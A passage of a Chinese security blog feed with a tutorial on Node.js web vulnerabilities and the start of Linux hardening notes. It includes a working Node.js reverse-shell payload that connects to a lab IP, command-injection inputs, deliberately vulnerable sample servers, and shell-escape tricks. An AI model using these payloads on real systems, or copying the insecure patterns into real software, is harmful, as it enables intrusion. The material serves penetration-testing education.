class="line">?a=1&amp;b=process.exit()</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析Node-js安全/3.png" alt=""></p><p>再深入利用，反弹shell的payload如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rev</span>(<span class="params">host,port</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"><span class="keyword">var</span> cp  = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"><span class="keyword">var</span> cmd = cp.spawn(<span class="string">'cmd.exe'</span>, []);</span><br><span class="line"><span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">client.connect(port, host, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">client.write(<span class="string">'Connected\r\n'</span>); client.pipe(cmd.stdin); cmd.stdout.pipe(client);</span><br><span class="line">cmd.stderr.pipe(client);</span><br><span class="line">client.on( <span class="string">'exit'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">code,signal</span>)</span>&#123; client.end(<span class="string">'Disconnected\r\n'</span>); &#125; );</span><br><span class="line">client.on( <span class="string">'error'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123; setTimeout( rev(host,port), <span class="number">5000</span>); &#125;)</span><br><span class="line">&#125;);</span><br><span class="line">&#125;;</span><br><span class="line">rev(<span class="string">'192.168.10.137'</span>, <span class="number">4444</span>);</span><br></pre></td></tr></table></figure><p>直接注入访问：</p><p><img src="/2020/03/29/浅析Node-js安全/4.png" alt=""></p><p>在Kali中成功拿到反弹shell：</p><p><img src="/2020/03/29/浅析Node-js安全/5.png" alt=""></p><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>Node.js同样存在命名注入漏洞，需重点关注模块child_process的函数，因为这个模块包含了创建一个新进程来执行系统命令的功能。</p><p>示例代码如下，直接使用外部参数拼接ping命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> cmd = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">cmd.exec(<span class="string">"ping -n 4 "</span> + req.query.ip,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">res.send(<span class="string">'Ping Results: &lt;pre&gt;'</span> + data + <span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p>正常访问：</p><p><img src="/2020/03/29/浅析Node-js安全/6.png" alt=""></p><p>尝试进行命令注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=|whoami</span><br><span class="line">?ip=127.0.0.1||whoami</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析Node-js安全/7.png" alt=""></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>Node.js本身没有XSS防护机制，也不像Java那样拥有强大的过滤器来实现过滤用户的有害输入从而防御XSS。若是未经过滤直接显示外部的输入则导致XSS。但是可以通过设置HTTP头中加入X-XSS-Protection在浏览器端缓解XSS。</p><p>示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">res.send(<span class="string">'Hello, '</span> + req.query.name);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p>直接注入XSS payload即可：</p><p><img src="/2020/03/29/浅析Node-js安全/8.png" alt=""></p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>Node.js的needle模块可发起GET/POST等HTTP请求，当其参数外部可控时可造成SSRF漏洞。</p><p>示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> needle = <span class="built_in">require</span>(<span class="string">'needle'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> url = req.query[<span class="string">'url'</span>];</span><br><span class="line">needle.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">error, response</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!error &amp;&amp; response.statusCode == <span class="number">200</span>)</span><br><span class="line">res.send(response.body);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'new request:'</span> + url);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析Node-js安全/9.png" alt=""></p><h3 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h3><p>Node.js有一个奇怪的特性，即允许一个参数有多个值。假设有一个参数叫做name，我们给这个参数传递了多个值，最终name参数将包含这两个值，两个值之间用逗号隔开。该特性可用来进行参数解析漏洞的利用。</p><p>示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> name = req.query.name;</span><br><span class="line">res.send(<span class="string">"Name: "</span> + name);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p><img src="/2020/03/29/浅析Node-js安全/10.png" alt=""></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><blockquote><p>Node.js的网站注入漏洞很少。Node.js通常与mysql/mongodb搭配使用，因为sql注入的漏洞危害很高并且存在多年了，一些新出现的语言如openresty+lua/node.js等天生会规避掉这种安全问题。它们通常都采用了占位符或者叫参数化查询来与数据库交互。node.js 原生的与数据库交互代码如下：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mysql = <span class="built_in">require</span> (<span class="string">'mysql'</span>) ; </span><br><span class="line"><span class="keyword">var</span> connection = mysql .createConnection(</span><br><span class="line">&#123; <span class="attr">host</span>: <span class="string">'localhost'</span>, </span><br><span class="line">user: <span class="string">'root'</span>, </span><br><span class="line">password: <span class="string">'root'</span>,</span><br><span class="line">port: <span class="string">'3306'</span>, </span><br><span class="line">database: <span class="string">'admin'</span>, &#125;) ; </span><br><span class="line">connection.connect( ); </span><br><span class="line"><span class="keyword">var</span> sql = <span class="string">'select * from admin where id =?'</span><span class="string">'; </span></span><br><span class="line"><span class="string">Var  param=[1];</span></span><br><span class="line"><span class="string">connection.query( sql，param); </span></span><br><span class="line"><span class="string">connection.end( );</span></span><br></pre></td></tr></table></figure><blockquote><p>Node.js现在已经有了orm框架（比如Sequelize），因此注入漏洞就跟少了。但是如果程序员写代码时不小心用了字符串拼接，还是会造成sql注入的。如下：</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span>  <span class="keyword">where</span> <span class="keyword">id</span>=$<span class="keyword">id</span></span><br></pre></td></tr></table></figure><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><blockquote><p>Node.js的网站由于特有的路由规则，它的的上传问题虽然不像php、jsp、asp等脚本语言，若攻击者上传若未经过滤的脚本，便可轻松的拿到shel。但是代码中若存在路径跳转漏洞，攻击者可以直接将shell脚本木马上传到/etc/rc.d等启动项下面,或者是直接上传相应的index.js文件覆盖到第三方模块express等目录下，通过精心构造的js文件也能实现命令执行的目的。</p></blockquote><p>文件上传示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>);</span><br><span class="line">app.use(multer(&#123; <span class="attr">dest</span>: <span class="string">'E:/'</span>&#125;).array(<span class="string">'image'</span>));</span><br><span class="line">app.use(express.static(<span class="string">'public'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> port = <span class="number">8181</span>;</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(req.files[<span class="number">0</span>]);  <span class="comment">// 上传的文件信息</span></span><br><span class="line"><span class="keyword">var</span> des_file = __dirname + <span class="string">'/'</span> + req.files[<span class="number">0</span>].originalname;</span><br><span class="line">fs.readFile( req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">fs.writeFile(des_file, data, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>( err )&#123;</span><br><span class="line"><span class="built_in">console</span>.log( err );</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">response = &#123;</span><br><span class="line">message:<span class="string">'File uploaded successfully'</span>,</span><br><span class="line">filename:req.files[<span class="number">0</span>].originalname</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log( response );</span><br><span class="line">res.end( <span class="built_in">JSON</span>.stringify( response ) );</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"App is listening on port: "</span> + port);</span><br><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><p>uploadfile.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>File<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Upload File: <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:8181/"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"image"</span> <span class="attr">size</span>=<span class="string">"50"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"upload"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上传文件示例：</p><p><img src="/2020/03/29/浅析Node-js安全/11.png" alt=""></p><h3 id="NPM"><a href="#NPM" class="headerlink" title="NPM"></a>NPM</h3><blockquote><p>任何人都可以创建模块发布到npm上，供别人调用，虽然这为开发者带来了一定的便利性，但必然隐藏着安全隐患，假如一不小心使用了不安全的第三方模块后果可想而知了，比如前段时间闹得沸沸扬扬的node-serialize模块所引起的远程代码执行漏洞（cve-2017-5914）。现在有一款NSP 工具可以帮助检查第三方模块现有漏洞。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm i nsp –g //安装nsp</span><br><span class="line">nsp check 要检查的package.json //检查是否有漏洞</span><br></pre></td></tr></table></figure><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>可参考：<a href="/2020/03/29/node-serialize反序列化漏洞/">《node-serialize反序列化漏洞》</a>。</p><h2 id="0x03-工具"><a href="#0x03-工具" class="headerlink" title="0x03 工具"></a>0x03 工具</h2><p>参考：<a href="https://github.com/ajinabraham/NodeJsScan" target="_blank" rel="noopener">https://github.com/ajinabraham/NodeJsScan</a></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.freebuf.com/articles/web/152891.html" target="_blank" rel="noopener">浅谈Node.js Web的安全问题</a></p><p><a href="https://www.jianshu.com/p/8253adac33d8" target="_blank" rel="noopener">渗透测试 Node.js 应用</a></p><p><a href="https://zhuanlan.zhihu.com/p/25894270" target="_blank" rel="noopener">实战教你如何利用NodeJS 漏洞？</a></p><p><a href="https://resources.infosecinstitute.com/penetration-testing-node-js-applications-part-1/" target="_blank" rel="noopener">An Introduction to Penetration Testing Node.js Applications</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/categories/JavaScript/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="JavaScript" scheme="https://www.mi1k7ea.com/tags/JavaScript/"/>
    
      <category term="Node.js" scheme="https://www.mi1k7ea.com/tags/Node-js/"/>
    
  </entry>
  
  <entry>
    <title>Linux安全笔记</title>
    <link href="https://www.mi1k7ea.com/2020/03/28/Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.mi1k7ea.com/2020/03/28/Linux安全笔记/</id>
    <published>2020-03-28T13:33:27.000Z</published>
    <updated>2020-03-28T17:08:28.370Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Linux中一些基础安全问题的排查笔记。</p><h2 id="0x01-已知CVE漏洞"><a href="#0x01-已知CVE漏洞" class="headerlink" title="0x01 已知CVE漏洞"></a>0x01 已知CVE漏洞</h2><p>Linux最大的安全问题就是自带的重要组件及内核存在已知CVE漏洞。</p><ul><li>对于Linux Server，可查询供应商的补丁版本情况，与被测版本进行对比。</li><li>对于嵌入式Linux，可及时跟踪cvedetails网站，关注kernel、glibc、openssl、bash、openssh等重要组件的CVE漏洞情况。</li></ul><h2 id="0x02-进程权限管理"><a href="#0x02-进程权限管理" class="headerlink" title="0x02 进程权限管理"></a>0x02 进程权限管理</h2><h3 id="业务进程以root权限运行"><a href="#业务进程以root权限运行" class="headerlink" title="业务进程以root权限运行"></a>业务进程以root权限运行</h3><p>用<code>ps</code>命令列出Linux中所有进程信息，逐个确认以root权限运行的进程是否为必要的，应尽量满足最小权限原则。</p><h3 id="业务进程以root启动但使用seteuid进行伪装"><a href="#业务进程以root启动但使用seteuid进行伪装" class="headerlink" title="业务进程以root启动但使用seteuid进行伪装"></a>业务进程以root启动但使用seteuid进行伪装</h3><p>在Linux下有4个UID：RUID（real user id，实际用户ID）、EUID（effective user id，有效用户ID）、SUID（saved user id，保存的设置用户ID）、SUID（set user id），其具体区别如下：</p><ol><li>RUID，用于在系统中标识一个用户是谁，当用户使用用户名和密码成功登录后一个Linux系统后就唯一确定了他的RUID；</li><li>EUID，用于系统决定用户对系统资源的访问权限，通常情况下等于RUID；</li><li>SUID（set user id），用于对外权限的开放。跟RUID及EUID是用一个用户绑定不同，它是跟文件而不是跟用户绑定；</li><li>saved uid，这个实际上是一个虚拟概念，其对应的实际上还是RUID和SUID，只是在不同身份之间切换时变成对应的值；</li></ol><p>在Linux中设置uid的几个函数如下。</p><p>int setuid(uid_t uid) ：</p><ul><li>若进程具有超级用户权限，则setuid将实际用户ID、有效用户ID及保存的设置用户ID设置为uid </li><li>若进程没有超级用户权限，但是uid等于实际用户ID或保存的设置用户ID，则setuid只将有效用户ID设置为uid</li></ul><p>int seteuid(uid_t uid) ：</p><ul><li>若进程具有超级用户权限，则setuid只将有效用户ID设置为uid </li><li>若进程没有超级用户权限，则setuid只将有效用户ID设置为uid，但是uid必须等于实际用户ID或保存的设置用户ID</li></ul><p>int setreuid(uid_t ruid, uid_t euid) ：</p><ul><li>针对设置用户ID位的程序: 交换有效用户ID和保存的设置用户ID</li><li>针对没有设置用户ID位的程序: 交换有效用户ID和实际用户ID</li></ul><p><strong>setuid()与seteuid()的区别</strong></p><p>setuid()用来重新设置执行目前进程的用户识别码。不过，要让此函数有作用，其有效的用户识别码必须为0(root)。在Linux下，当root使用setuid()来变换成其他用户识别码时，root权限会被抛弃，完全转换成该用户身份。也就是说，该进程往后将不再具有可setuid()的权利，如果只是向暂时抛弃root 权限，稍后想重新取回权限，则必须使用seteuid()。</p><p><strong>问题场景</strong></p><p>某些场景下，在启动业务进程时，以root用户运行，但在初始化结束后调用seteuid降为普通用户，使用<code>ps</code>命令查看时对应的进程用户显示为普通用户。但是，此时业务进程可以在任何时候调用seteuid切换为root用户。</p><p>这种情况尤为需要警惕，因为业务进程实际上是具备root权限的，只是使用seteuid进行伪装而已。</p><p>排查方法：使用IDA打开业务进程对应的二进制文件（含所依赖的动态库），查看其中是否存在调用seteuid，若有则表示进行在运行中会随时切换用户。</p><h2 id="0x03-文件访问权限"><a href="#0x03-文件访问权限" class="headerlink" title="0x03 文件访问权限"></a>0x03 文件访问权限</h2><h3 id="系统存在未授权的suid权限的程序"><a href="#系统存在未授权的suid权限的程序" class="headerlink" title="系统存在未授权的suid权限的程序"></a>系统存在未授权的suid权限的程序</h3><p>在Linux中，SUID是Set User ID，SGID是Set Group ID。suid意味着如果A用户对属于他自己的shell脚本文件设置了这种权限，那么其他用户在执行这个脚本的时候就拥有了A用户的权限。所以，如果root用户对某一脚本设置了这一权限的话则其他用户执行该脚本的时候则拥有了root用户权限。同理，guid意味着执行相应脚本的用户则拥有了该文件所属用户组中用户的权限。</p><p>系统会自带一些具备suid权限位的程序，特征就是代表execute权限位的”x”为”s”，例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ski12@ubuntu:~$ ls -l /usr/bin/passwd </span><br><span class="line">-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd</span><br><span class="line">ski12@ubuntu:~$</span><br></pre></td></tr></table></figure><p>若一个二进制文件本来无可执行权限，却又被增加了suid权限位，对应的execute权限位就是大写的”S”，出现这种情况一般是文件权限设定错误，在文件没有可执行权限时，没有危害，但还是需要去除suid权限位。</p><p>需要关注的是那些无需suid权限位的二进制文件被设置了suid权限，可以使用find命令将系统中属主为root的suid权限的文件找出来，逐个确认：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -user root -perm -4000 -print</span><br></pre></td></tr></table></figure><p><img src="/2020/03/28/Linux安全笔记/1.png" alt=""></p><p>同样的，具备sgid权限的二进制文件，表示在执行过程中会获取二进制文件所属group权限，查找命令如下，对列出的文件逐个确认即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -2000 -print</span><br></pre></td></tr></table></figure><p><img src="/2020/03/28/Linux安全笔记/2.png" alt=""></p><h3 id="属主为普通用户的二进制文件被root执行"><a href="#属主为普通用户的二进制文件被root执行" class="headerlink" title="属主为普通用户的二进制文件被root执行"></a>属主为普通用户的二进制文件被root执行</h3><p>若属主为普通用户的文件或普通用户具有写权限的文件，当root在某些场景下会自发运行该可执行文件时，如果普通用户往文件内容中插入恶意代码，则会造成提权等安全问题。</p><p>另外，Crontab定时任务所执行的脚本或命令同样是需要重点排查的对象。</p><h3 id="普通用户拥有设备文件的读写权限"><a href="#普通用户拥有设备文件的读写权限" class="headerlink" title="普通用户拥有设备文件的读写权限"></a>普通用户拥有设备文件的读写权限</h3><p>除了/dev/zero、/dev/random、/dev/null等一些公用设备，大部分设备普通用户是不能有读写权限的，具体情况具体分析。</p><h2 id="0x04-用户管理"><a href="#0x04-用户管理" class="headerlink" title="0x04 用户管理"></a>0x04 用户管理</h2><h3 id="用户口令安全"><a href="#用户口令安全" class="headerlink" title="用户口令安全"></a>用户口令安全</h3><p>建议系统及相关组件服务的用户口令至少满足如下要求：</p><ul><li>口令长度&gt;=6个字符；</li><li>口令必须至少包含一个大写字母、小写字母和数字；</li><li>口令不能是连续的数字或同样的字母；</li><li>口令不能和账号明显关联；</li></ul><p>排查方法：</p><ol><li>查看系统的密码复杂度设置；</li><li>修改用户密码，检测是否校验旧密码，是否对新密码进行复杂度校验；</li></ol><h3 id="普通用户具有过多权限"><a href="#普通用户具有过多权限" class="headerlink" title="普通用户具有过多权限"></a>普通用户具有过多权限</h3><p>普通用户具备过多权限会引起越权问题，如在管理群组中uid为0等。</p><p>排查方法：</p><ol><li>查看系统/etc/passwd文件中的用户定义，是否存在多个uid为0的用户；</li><li>查看/etc/group文件，root组中是否包含多余用户；</li></ol><h3 id="sudo配置错误导致普通用户可提权执行任意命令"><a href="#sudo配置错误导致普通用户可提权执行任意命令" class="headerlink" title="sudo配置错误导致普通用户可提权执行任意命令"></a>sudo配置错误导致普通用户可提权执行任意命令</h3><p>sudo用于以另一用户的身份执行指定的命令，可执行的命令在sudoer配置文件中指定。由于配置疏忽，提供了一些通用命令，攻击者可以利用这些通用命令进行组合，越权更改系统配置文件。另一个错误点为指定的命令是一个脚本，而普通用户具备该脚本的权限，从而执行任意命令。</p><p>通过查看sudo配置文件是否包含targetpw来排查：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep targetpw /etc/sudoers</span><br></pre></td></tr></table></figure><p>如果无输出，或者输出的行以<code>#</code>开头，则表示启用了sudo。接着执行visudo命令，查看其中的命令列表是否存在<code>cp</code>、<code>chmod</code>等通用命令。</p><p>对于命令列表中的脚本，进一步排查脚本的属主和读写权限，要求属主是root，并且group和others无写权限。</p><h2 id="0x05-命令逃逸"><a href="#0x05-命令逃逸" class="headerlink" title="0x05 命令逃逸"></a>0x05 命令逃逸</h2><h3 id="shell逃逸"><a href="#shell逃逸" class="headerlink" title="shell逃逸"></a>shell逃逸</h3><p>如果在应用了具备执行外部shell命令的工具，存在通过执行外部命令逃逸处应用的风险。</p><h4 id="more命令逃逸"><a href="#more命令逃逸" class="headerlink" title="more命令逃逸"></a>more命令逃逸</h4><p><code>!whoami</code>能逃逸到shell执行whoami命令。</p><h4 id="less命令逃逸"><a href="#less命令逃逸" class="headerlink" title="less命令逃逸"></a>less命令逃逸</h4><p><code>!whoami</code>能逃逸到shell执行whoami命令。</p><h4 id="vi-vim命令逃逸"><a href="#vi-vim命令逃逸" class="headerlink" title="vi/vim命令逃逸"></a>vi/vim命令逃逸</h4><p><code>!whoami</code>能逃逸到shell执行whoami命令。</p><h4 id="gdb命令逃逸"><a href="#gdb命令逃逸" class="headerlink" title="gdb命令逃逸"></a>gdb命令逃逸</h4><p><code>shell whoami</code>能逃逸到shell执行whoami命令。</p><h3 id="自定义shell界面存在逃逸"><a href="#自定义shell界面存在逃逸" class="headerlink" title="自定义shell界面存在逃逸"></a>自定义shell界面存在逃逸</h3><p>原理：有些自定义的产品在对用户展示信息时，有可能会调用外部的less、more等命令来实现的，若是这种场景则可能存在命令逃逸的风险。</p><p>排查方法：分析自定义的二进制文件所调用的system、exec、popen等函数的调用点，查看是否有执行具备外部逃逸命令行为的调用。</p><h2 id="0x06-本地提权"><a href="#0x06-本地提权" class="headerlink" title="0x06 本地提权"></a>0x06 本地提权</h2><p>当使用root用户访问低权限用户的目录时，低权限用户可以更改此目录为符号链接，指向自己没有权限操作的位置，达到改写任意文件的目的。</p><p>除此之外，当root用户运行属主为低权限用户的脚本或者低权限用户拥有写权限的脚本时，同样存在本地提权问题。</p><p>具体可参考：<a href="https://www.halfdog.net/Security/2015/NtpCronjobUserNtpToRootPrivilegeEscalation/" target="_blank" rel="noopener">https://www.halfdog.net/Security/2015/NtpCronjobUserNtpToRootPrivilegeEscalation/</a></p><h2 id="0x07-sysctl"><a href="#0x07-sysctl" class="headerlink" title="0x07 sysctl"></a>0x07 